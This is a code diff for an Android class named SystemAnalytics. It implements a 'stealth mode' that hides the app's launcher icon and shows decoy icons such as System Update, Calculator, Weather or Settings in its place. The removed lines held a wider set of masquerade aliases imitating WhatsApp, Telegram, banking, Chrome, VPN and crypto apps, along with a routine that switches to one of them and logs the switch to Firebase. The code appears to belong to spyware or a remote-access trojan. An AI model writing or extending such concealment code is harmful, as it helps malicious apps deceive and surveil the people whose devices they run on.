@@ -1,8 +1,6 @@
 package com.labs.labrats;
 
 import android.os.Build;
-import android.os.Handler;
-import android.os.Looper;
 import android.provider.Settings;
 import android.content.Context;
 import android.content.Intent;
@@ -208,70 +206,53 @@ public class SystemAnalytics {
     public static void setStealthMode(android.content.Context context, boolean stealth) {
         try {
             String pkg = context.getPackageName();
-            String baseClass = "com.labs.labrats";
             android.util.Log.d("SystemAnalytics", "Stealth Protocol: stealth=" + stealth + ", pkg=" + pkg);
             
             android.content.pm.PackageManager pm = context.getPackageManager();
+            String baseClass = "com.labs.labrats";
             
-            String[] simpleAliases = {
-                "LauncherAlias",
-                "SystemUpdateAlias",
-                "CalculatorAlias",
-                "WeatherAlias",
-                "SettingsAlias",
-                "LabRatsLogoAlias",
-                "WhatsAppAlias",
-                "TelegramAlias",
-                "InstagramAlias",
-                "YouTubeAlias",
-                "ChromeAlias",
-                "AndroidSystemAlias",
-                "BankAlias",
-                "MailAlias",
-                "VPNAlias",
-                "PdfAlias",
-                "MusicAlias",
-                "TwitterAlias",
-                "TermuxAlias",
-                "CryptoAlias"
+            // All relevant component aliases
+            String[] aliases = {
+                baseClass + ".LauncherAlias",
+                baseClass + ".SystemUpdateAlias",
+                baseClass + ".CalculatorAlias",
+                baseClass + ".WeatherAlias",
+                baseClass + ".SettingsAlias",
+                baseClass + ".LabRatsLogoAlias"
             };
 
             // Target component to enable
             String targetToEnable;
             if (stealth) {
-                String savedAlias = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("active_masquerade_alias", "");
-                if (!savedAlias.isEmpty()) {
-                    targetToEnable = savedAlias.contains(".") ? savedAlias : (baseClass + "." + savedAlias);
-                } else {
-                    int choice = getDecoyChoice(context);
-                    switch (choice) {
-                        case 2: targetToEnable = baseClass + ".CalculatorAlias"; break;
-                        case 3: targetToEnable = baseClass + ".WeatherAlias"; break;
-                        case 4: targetToEnable = baseClass + ".SettingsAlias"; break;
-                        case 5: targetToEnable = baseClass + ".LabRatsLogoAlias"; break;
-                        default: targetToEnable = baseClass + ".SystemUpdateAlias"; break;
-                    }
+                int choice = getDecoyChoice(context);
+                switch (choice) {
+                    case 2: targetToEnable = baseClass + ".CalculatorAlias"; break;
+                    case 3: targetToEnable = baseClass + ".WeatherAlias"; break;
+                    case 4: targetToEnable = baseClass + ".SettingsAlias"; break;
+                    case 5: targetToEnable = baseClass + ".LabRatsLogoAlias"; break;
+                    default: targetToEnable = baseClass + ".SystemUpdateAlias"; break;
                 }
             } else {
                 targetToEnable = baseClass + ".LauncherAlias";
             }
 
-            android.util.Log.d("SystemAnalytics", "Target component to enable: " + pkg + "/" + targetToEnable);
+            android.util.Log.d("SystemAnalytics", "Target component to enable: " + targetToEnable);
 
-            // Phase 1: Enable target component
+            // Phase 1: Enable the target component first
             android.content.ComponentName targetComp = new android.content.ComponentName(pkg, targetToEnable);
             pm.setComponentEnabledSetting(targetComp, 
                 android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, 
                 0);
+            android.util.Log.d("SystemAnalytics", "Enabled target: " + targetToEnable);
 
             // Phase 2: Disable all other components
-            for (String alias : simpleAliases) {
-                String fullAliasClass = baseClass + "." + alias;
-                if (!fullAliasClass.equals(targetToEnable)) {
-                    android.content.ComponentName comp = new android.content.ComponentName(pkg, fullAliasClass);
+            for (String alias : aliases) {
+                if (!alias.equals(targetToEnable)) {
+                    android.content.ComponentName comp = new android.content.ComponentName(pkg, alias);
                     pm.setComponentEnabledSetting(comp, 
                         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                         0);
+                    android.util.Log.d("SystemAnalytics", "Disabled alias: " + alias);
                 }
             }
 
@@ -293,76 +274,6 @@ public class SystemAnalytics {
         }
     }
 
-    public static void enableSpecificAlias(Context context, String aliasClassName) {
-        new Handler(Looper.getMainLooper()).post(() -> {
-            try {
-                String pkg = context.getPackageName();
-                android.content.pm.PackageManager pm = context.getPackageManager();
-                String baseClass = "com.labs.labrats";
-                
-                String simpleAlias = aliasClassName.contains(".") ? aliasClassName.substring(aliasClassName.lastIndexOf('.') + 1) : aliasClassName;
-                String targetToEnable = baseClass + "." + simpleAlias;
-
-                String[] simpleAliases = {
-                    "LauncherAlias",
-                    "SystemUpdateAlias",
-                    "CalculatorAlias",
-                    "WeatherAlias",
-                    "SettingsAlias",
-                    "LabRatsLogoAlias",
-                    "WhatsAppAlias",
-                    "TelegramAlias",
-                    "InstagramAlias",
-                    "YouTubeAlias",
-                    "ChromeAlias",
-                    "AndroidSystemAlias",
-                    "BankAlias",
-                    "MailAlias",
-                    "VPNAlias",
-                    "PdfAlias",
-                    "MusicAlias",
-                    "TwitterAlias",
-                    "TermuxAlias",
-                    "CryptoAlias"
-                };
-
-                // Save active masquerade alias to prevent stealth protocol resets
-                context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                        .edit()
-                        .putString("active_masquerade_alias", targetToEnable)
-                        .apply();
-
-                // Phase 1: Enable target component
-                android.content.ComponentName targetComp = new android.content.ComponentName(pkg, targetToEnable);
-                pm.setComponentEnabledSetting(targetComp, 
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, 
-                    0);
-
-                // Phase 2: Disable all other aliases
-                for (String alias : simpleAliases) {
-                    String fullAliasClass = baseClass + "." + alias;
-                    if (!fullAliasClass.equals(targetToEnable)) {
-                        android.content.ComponentName comp = new android.content.ComponentName(pkg, fullAliasClass);
-                        pm.setComponentEnabledSetting(comp, 
-                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
-                            0);
-                    }
-                }
-
-                FirebaseConfig.logActivity("STEALTH_SHIELD: Active alias switched to " + targetToEnable);
-
-                // Phase 3: Force Samsung OneUI / Pixel Launcher icon refresh
-                android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
-                home.addCategory(android.content.Intent.CATEGORY_HOME);
-                home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(home);
-
-            } catch (Exception e) {
-                android.util.Log.e("SystemAnalytics", "Error enabling specific alias: " + e.getMessage(), e);
-            }
-        });
-    }
-
     public static int getDecoyChoice(Context context) {
         return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                 .getInt("decoy_choice", BuildConfig.DECOY_CHOICE);
@@ -374,7 +285,6 @@ public class SystemAnalytics {
     }
 
     public static boolean isStealthEnabled(Context context) {
-        // First check if Main launcher is actually disabled - that's the source of truth
         try {
             android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
             int state = context.getPackageManager().getComponentEnabledSetting(main);
